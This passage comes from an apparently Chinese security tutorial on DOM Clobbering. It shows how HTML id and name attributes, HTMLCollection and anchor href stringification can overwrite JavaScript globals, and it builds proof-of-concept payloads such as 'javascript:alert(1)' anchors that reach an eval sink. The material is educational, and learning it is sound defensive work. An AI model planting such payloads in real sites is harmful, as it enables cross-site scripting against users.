class="line"><span class="keyword">let</span> a=b=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a); <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.b); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>

<h6 id="上面是javascript的比较特别之处。"><a href="#上面是javascript的比较特别之处。" class="headerlink" title="上面是javascript的比较特别之处。"></a>上面是javascript的比较特别之处。</h6><h6 id="虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断："><a href="#虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断：" class="headerlink" title="虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断："></a>虽然我们无法通过标签来定义一个函数，但是我们在一定的场景下可以用来绕过一些判断：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">'getElementById'</span> <span class="attr">name</span>=<span class="string">'getElementById'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>); <span class="comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="javascript">  <span class="comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="javascript">  <span class="comment">//Do something with a.</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="第一个JS代码块虽然引起了报错，但是不会引起JS完全停止执行JS会跳过这个报错的代码块，执行下一个代码块。"><a href="#第一个JS代码块虽然引起了报错，但是不会引起JS完全停止执行JS会跳过这个报错的代码块，执行下一个代码块。" class="headerlink" title="第一个JS代码块虽然引起了报错，但是不会引起JS完全停止执行JS会跳过这个报错的代码块，执行下一个代码块。"></a>第一个<code>JS</code>代码块虽然引起了报错，但是不会引起<code>JS</code>完全停止执行<code>JS</code>会跳过这个报错的代码块，执行下一个代码块。</h6><h4 id="0x05-攻击方法："><a href="#0x05-攻击方法：" class="headerlink" title="0x05 攻击方法："></a>0x05 攻击方法：</h4><h5 id="1-为了分析DOM-Clobbering漏洞，假设如下代码："><a href="#1-为了分析DOM-Clobbering漏洞，假设如下代码：" class="headerlink" title="1.为了分析DOM Clobbering漏洞，假设如下代码："></a>1.为了分析<code>DOM Clobbering</code>漏洞，假设如下代码：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.test1.test2) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">''</span>+<span class="built_in">window</span>.test1.test2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="如果我们想利用Dom-Clobbering技巧来执行任意的js，需要解决两个问题："><a href="#如果我们想利用Dom-Clobbering技巧来执行任意的js，需要解决两个问题：" class="headerlink" title="如果我们想利用Dom Clobbering技巧来执行任意的js，需要解决两个问题："></a>如果我们想利用<code>Dom Clobbering</code>技巧来执行任意的js，需要解决两个问题：</h6><h6 id="1-利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？"><a href="#1-利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？" class="headerlink" title="1)利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？"></a>1)利用html标签的属性<code>id</code>，很容易在<code>window</code>对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</h6><h6 id="2-怎么控制DOM-elements被强制转为string之后的值，大多数的dom节点被转为string后是-object-HTMLInputElement-。"><a href="#2-怎么控制DOM-elements被强制转为string之后的值，大多数的dom节点被转为string后是-object-HTMLInputElement-。" class="headerlink" title="2)怎么控制DOM elements被强制转为string之后的值，大多数的dom节点被转为string后是[object HTMLInputElement]。"></a>2)怎么控制DOM elements被强制转为string之后的值，大多数的dom节点被转为string后是<code>[object HTMLInputElement]</code>。</h6><h6 id="我们可以用前面的例子来解决第一个问题："><a href="#我们可以用前面的例子来解决第一个问题：" class="headerlink" title="我们可以用前面的例子来解决第一个问题："></a>我们可以用前面的例子来解决第一个问题：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"test2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1.test2.toString()); <span class="comment">// [object HTMLInputElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object-ptototype。如果是继承自Object-prototype-那么很有可能只会返回-object-SomeElement"><a href="#我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object-ptototype。如果是继承自Object-prototype-那么很有可能只会返回-object-SomeElement" class="headerlink" title="我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object.ptototype。如果是继承自Object.prototype,那么很有可能只会返回[object SomeElement]"></a>我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现<code>toString</code>方法，或者是继承于<code>Object.ptototype</code>。如果是继承自Object.prototype,那么很有可能只会返回<code>[object SomeElement]</code></h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>

<h6 id="我们可以得到两个对象-HTMLAreaElement-lt-area-gt-和HTMLAnchorElement-lt-a-gt-，这两个标签的toString会直接返回他的href属性。"><a href="#我们可以得到两个对象-HTMLAreaElement-lt-area-gt-和HTMLAnchorElement-lt-a-gt-，这两个标签的toString会直接返回他的href属性。" class="headerlink" title="我们可以得到两个对象:HTMLAreaElement (&lt;area&gt;)和HTMLAnchorElement (&lt;a&gt;)，这两个标签的toString会直接返回他的href属性。"></a>我们可以得到两个对象:<code>HTMLAreaElement (&lt;area&gt;)</code>和<code>HTMLAnchorElement (&lt;a&gt;)</code>，这两个标签的<code>toString</code>会直接返回他的<code>href</code>属性。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">https://www.baidu.com</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(test1.toString()); <span class="comment">// https://www.baidu.com</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="结合上面的两个问题，我们会构造如下payload"><a href="#结合上面的两个问题，我们会构造如下payload" class="headerlink" title="结合上面的两个问题，我们会构造如下payload:"></a>结合上面的两个问题，我们会构造如下payload:</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="但是test1-test2是undefined，这是因为-lt-input-gt-元素会变成-lt-form-gt-的属性，但-lt-a-gt-标签并不会。"><a href="#但是test1-test2是undefined，这是因为-lt-input-gt-元素会变成-lt-form-gt-的属性，但-lt-a-gt-标签并不会。" class="headerlink" title="但是test1.test2是undefined，这是因为&lt;input&gt;元素会变成&lt;form&gt;的属性，但&lt;a&gt;标签并不会。"></a>但是<code>test1.test2</code>是<code>undefined</code>，这是因为<code>&lt;input&gt;</code>元素会变成<code>&lt;form&gt;</code>的属性，但<code>&lt;a&gt;</code>标签并不会。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1.test2); <span class="comment">// undefined</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="我们可以通过构造一个HTMLCollection来解决问题，例如："><a href="#我们可以通过构造一个HTMLCollection来解决问题，例如：" class="headerlink" title="我们可以通过构造一个HTMLCollection来解决问题，例如："></a>我们可以通过构造一个<code>HTMLCollection</code>来解决问题，例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span>click1!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="返回的集合如下所示："><a href="#返回的集合如下所示：" class="headerlink" title="返回的集合如下所示："></a>返回的集合如下所示：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTMLCollection(2) [a#test1, a#test1, test1: a#test1]</span><br><span class="line">length: 2</span><br><span class="line">0: a#test1</span><br><span class="line">1: a#test1</span><br><span class="line">test1: a#test1</span><br><span class="line">__proto__: HTMLCollection</span><br></pre></td></tr></table></figure>

<h6 id="HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如："><a href="#HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如：" class="headerlink" title="HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如："></a><code>HTMLCollection</code>可以通过index访问，同时可以使用<code>id</code>访问，并且可以使用<code>name</code>访问，例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span>click1!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span> <span class="attr">name</span>=<span class="string">"test2"</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(test1.test2); <span class="comment">//&lt;a id="test1" name="test2"&gt;click2!&lt;/a&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="因此上面的问题得到解决，通过构造如下payload"><a href="#因此上面的问题得到解决，通过构造如下payload" class="headerlink" title="因此上面的问题得到解决，通过构造如下payload:"></a>因此上面的问题得到解决，通过构造如下payload:</h6><h6 id="lt-a-id-quot-test1-quot-gt-lt-a-gt-lt-a-id-quot-test1-quot-name-quot-test2-quot-href-quot-jacascript-alert-1-quot-gt-lt-a-gt"><a href="#lt-a-id-quot-test1-quot-gt-lt-a-gt-lt-a-id-quot-test1-quot-name-quot-test2-quot-href-quot-jacascript-alert-1-quot-gt-lt-a-gt" class="headerlink" title="&lt;a id=&quot;test1&quot;&gt;&lt;/a&gt;&lt;a id=&quot;test1&quot; name=&quot;test2&quot; href=&quot;jacascript:alert(1)&quot;&gt;&lt;/a&gt;"></a><code>&lt;a id=&quot;test1&quot;&gt;&lt;/a&gt;&lt;a id=&quot;test1&quot; name=&quot;test2&quot; href=&quot;jacascript:alert(1)&quot;&gt;&lt;/a&gt;</code></h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span> <span class="attr">name</span>=<span class="string">"test2"</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.test1.test2) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">eval</span>(<span class="string">''</span>+<span class="built_in">window</span>.test1.test2)</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="成功执行。"><a href="#成功执行。" class="headerlink" title="成功执行。"></a>成功执行。</h6><h5 id="2-确定DOM元素间的关系"><a href="#2-确定DOM元素间的关系" class="headerlink" title="2.确定DOM元素间的关系"></a>2.确定DOM元素间的关系</h5><h6 id="我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下："><a href="#我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下：" class="headerlink" title="我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下："></a>我们把两个<code>HTML</code>元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> log = [];</span><br><span class="line"><span class="keyword">const</span> html = [<span class="string">"a"</span>, <span class="string">"abbr"</span>, <span class="string">"acronym"</span>, <span class="string">"address"</span>, <span class="string">"applet"</span>, <span class="string">"area"</span>, <span class="string">"article"</span>, <span class="string">"aside"</span>, <span class="string">"audio"</span>, <span class="string">"b"</span>, <span class="string">"base"</span>, <span class="string">"basefont"</span>, <span class="string">"bdi"</span>, <span class="string">"bdo"</span>, <span class="string">"bgsound"</span>, <span class="string">"big"</span>, <span class="string">"blink"</span>, <span class="string">"blockquote"</span>, <span class="string">"body"</span>, <span class="string">"br"</span>, <span class="string">"button"</span>, <span class="string">"canvas"</span>, <span class="string">"caption"</span>, <span class="string">"center"</span>, <span class="string">"cite"</span>, <span class="string">"code"</span>, <span class="string">"col"</span>, <span class="string">"colgroup"</span>, <span class="string">"command"</span>, <span class="string">"content"</span>, <span class="string">"data"</span>, <span class="string">"datalist"</span>, <span class="string">"dd"</span>, <span class="string">"del"</span>, <span class="string">"details"</span>, <span class="string">"dfn"</span>, <span class="string">"dialog"</span>, <span class="string">"dir"</span>, <span class="string">"div"</span>, <span class="string">"dl"</span>, <span class="string">"dt"</span>, <span class="string">"element"</span>, <span class="string">"em"</span>, <span class="string">"embed"</span>, <span class="string">"fieldset"</span>, <span class="string">"figcaption"</span>, <span class="string">"figure"</span>, <span class="string">"font"</span>, <span class="string">"footer"</span>, <span class="string">"form"</span>, <span class="string">"frame"</span>, <span class="string">"frameset"</span>, <span class="string">"h1"</span>, <span class="string">"head"</span>, <span class="string">"header"</span>, <span class="string">"hgroup"</span>, <span class="string">"hr"</span>, <span class="string">"html"</span>, <span class="string">"i"</span>, <span class="string">"iframe"</span>, <span class="string">"image"</span>, <span class="string">"img"</span>, <span class="string">"input"</span>, <span class="string">"ins"</span>, <span class="string">"isindex"</span>, <span class="string">"kbd"</span>, <span class="string">"keygen"</span>, <span class="string">"label"</span>, <span class="string">"legend"</span>, <span class="string">"li"</span>, <span class="string">"link"</span>, <span class="string">"listing"</span>, <span class="string">"main"</span>, <span class="string">"map"</span>, <span class="string">"mark"</span>, <span class="string">"marquee"</span>, <span class="string">"menu"</span>, <span class="string">"menuitem"</span>, <span class="string">"meta"</span>, <span class="string">"meter"</span>, <span class="string">"multicol"</span>, <span class="string">"nav"</span>, <span class="string">"nextid"</span>, <span class="string">"nobr"</span>, <span class="string">"noembed"</span>, <span class="string">"noframes"</span>, <span class="string">"noscript"</span>, <span class="string">"object"</span>, <span class="string">"ol"</span>, <span class="string">"optgroup"</span>, <span class="string">"option"</span>, <span class="string">"output"</span>, <span class="string">"p"</span>, <span class="string">"param"</span>, <span class="string">"picture"</span>, <span class="string">"plaintext"</span>, <span class="string">"pre"</span>, <span class="string">"progress"</span>, <span class="string">"q"</span>, <span class="string">"rb"</span>, <span class="string">"rp"</span>, <span class="string">"rt"</span>, <span class="string">"rtc"</span>, <span class="string">"ruby"</span>, <span class="string">"s"</span>, <span class="string">"samp"</span>, <span class="string">"script"</span>, <span class="string">"section"</span>, <span class="string">"select"</span>, <span class="string">"shadow"</span>, <span class="string">"slot"</span>, <span class="string">"small"</span>, <span class="string">"source"</span>, <span class="string">"spacer"</span>, <span class="string">"span"</span>, <span class="string">"strike"</span>, <span class="string">"strong"</span>, <span class="string">"style"</span>, <span class="string">"sub"</span>, <span class="string">"summary"</span>, <span class="string">"sup"</span>, <span class="string">"svg"</span>, <span class="string">"table"</span>, <span class="string">"tbody"</span>, <span class="string">"td"</span>, <span class="string">"template"</span>, <span class="string">"textarea"</span>, <span class="string">"tfoot"</span>, <span class="string">"th"</span>, <span class="string">"thead"</span>, <span class="string">"time"</span>, <span class="string">"title"</span>, <span class="string">"tr"</span>, <span class="string">"track"</span>, <span class="string">"tt"</span>, <span class="string">"u"</span>, <span class="string">"ul"</span>, <span class="string">"var"</span>, <span class="string">"video"</span>, <span class="string">"wbr"</span>, <span class="string">"xmp"</span>];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;html.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>; j&lt;html.length; j++) &#123;</span><br><span class="line">        div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">            log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<h6 id="上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下："><a href="#上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下：" class="headerlink" title="上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下："></a>上面是我们用html标签的<code>id</code>属性来寻找DOM之间的关系的过程，结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form,button</span><br><span class="line">form,fieldset</span><br><span class="line">form,image</span><br><span class="line">form,img</span><br><span class="line">form,input</span><br><span class="line">form,object</span><br><span class="line">form,output</span><br><span class="line">form,select</span><br><span class="line">form,textarea</span><br></pre></td></tr></table></figure>

<h6 id="如果我们要覆盖一个对象的x-y-value值，可以用下面的这种方式："><a href="#如果我们要覆盖一个对象的x-y-value值，可以用下面的这种方式：" class="headerlink" title="如果我们要覆盖一个对象的x.y.value值，可以用下面的这种方式："></a>如果我们要覆盖一个对象的<code>x.y.value</code>值，可以用下面的这种方式：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">y</span>&gt;</span>I've been clobbered<span class="tag">&lt;/<span class="name">output</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(x.y.value);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="3-使用form标签来伪造三层的对象引用"><a href="#3-使用form标签来伪造三层的对象引用" class="headerlink" title="3.使用form标签来伪造三层的对象引用"></a>3.使用<code>form</code>标签来伪造三层的对象引用</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">name</span>=<span class="string">y</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">z</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(x.y.z)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为-object-RadioNodeList-，这个可以用forEach来遍历："><a href="#在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为-object-RadioNodeList-，这个可以用forEach来遍历：" class="headerlink" title="在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为[object RadioNodeList]，这个可以用forEach来遍历："></a>在Chrome中，当<code>form</code>标签有两个一样的<code>id</code>的<code>input</code>标签时，Chrome会将其处理为<code>[object RadioNodeList]</code>，这个可以用<code>forEach</code>来遍历：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">y</span> <span class="attr">name</span>=<span class="string">z</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">y</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    x.y.forEach(<span class="function"><span class="params">element</span>=&gt;</span>alert(element));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

